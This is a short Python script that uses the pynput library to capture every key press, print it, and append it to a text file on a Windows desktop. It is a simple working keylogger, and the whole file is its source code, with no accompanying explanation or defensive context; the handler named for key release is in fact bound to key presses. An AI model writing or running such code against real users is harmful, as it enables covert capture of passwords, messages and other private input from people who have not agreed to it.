import pynput.keyboard as keyboard


def on_key_release(key):
    print('%s' % key)
    file2write = open("C:\\Users\91949\Desktop\output.txt", 'a')
    file2write.write(', %s' % key )
    file2write.close()


with keyboard.Listener(on_press = on_key_release) as listener:
    listener.join()